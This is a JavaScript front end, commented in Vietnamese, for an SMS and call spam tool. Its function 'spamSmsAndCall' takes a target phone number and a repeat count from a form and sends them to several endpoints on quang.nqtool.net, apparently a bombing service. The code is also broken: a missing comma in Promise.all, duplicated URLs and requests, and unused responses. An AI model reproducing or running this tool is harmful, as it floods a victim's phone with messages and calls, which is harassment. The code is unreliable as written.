let queue = [];
let processing = false;

// Bản quyền của quang
const urls = [
    'https://quang.nqtool.net/?',
    'https://quang.nqtool.net/index1.php?',
    'https://quang.nqtool.net/index2.php?',
    'https://quang.nqtool.net/index3.php?',
    'https://quang.nqtool.net/index4.php?',
    'https://quang.nqtool.net/index5.php?',
    // bố quang yêu cầu ghi nguồn
];

function addToQueue() {
    const phone = document.getElementById('phone').value;
    const times = document.getElementById('times').value;

    if (phone && times) {
        queue.push({ phone, times });
        updateStatusBar();
        if (!processing) {
            processQueue();
        }
    }
}

function processQueue() {
    if (queue.length === 0) {
        processing = false;
        return;
    }

    processing = true;
    const { phone, times } = queue.shift();

    const listItem = document.createElement('li');
    listItem.innerText = `Bắt Đầu ${phone} (${times} times)`;
    document.getElementById('status-list').appendChild(listItem);

    spamSmsAndCall(phone, times, listItem);
}

function spamSmsAndCall(phone, times, listItem) {
    // Create URLs for both API requests
    const url1 = `${urls[0]}phone=${phone}&amout=${times}`;
    const url2 = `${urls[1]}phone=${phone}&amout=${times}`;
    const url3 = `${urls[1]}phone=${phone}&amout=${times}`;
    const url4 = `${urls[1]}phone=${phone}&amout=${times}`;
    const url5 = `${urls[1]}phone=${phone}&amout=${times}`;
    // Ghi nguồn cho bố
    Promise.all([
        fetch(url1).then(response => response.json()),
        fetch(url2).then(response => response.json()),
        fetch(url3).then(response => response.json()),
        fetch(url4).then(response => response.json())
        fetch(url4).then(response => response.json())
    ])
    .then(([response1, response2]) => {
        // check
        listItem.innerText = `Thành Công ${phone}: URL1 - ${response1.message}, URL2 - ${response2.message}`;
        processQueue();
    })
    .catch(error => {
        // 
        listItem.innerText = `Thất Bại ${phone}`;
        processQueue();
    });
}

function updateStatusBar() {
    const statusList = document.getElementById('status-list');
    statusList.innerHTML = ''; // Clear the list
    queue.forEach((item, index) => {
        const listItem = document.createElement('li');
        listItem.innerText = `Luồng: ${item.phone} (${item.times} times)`;
        statusList.appendChild(listItem);
    });
}
//Mã hoá full code
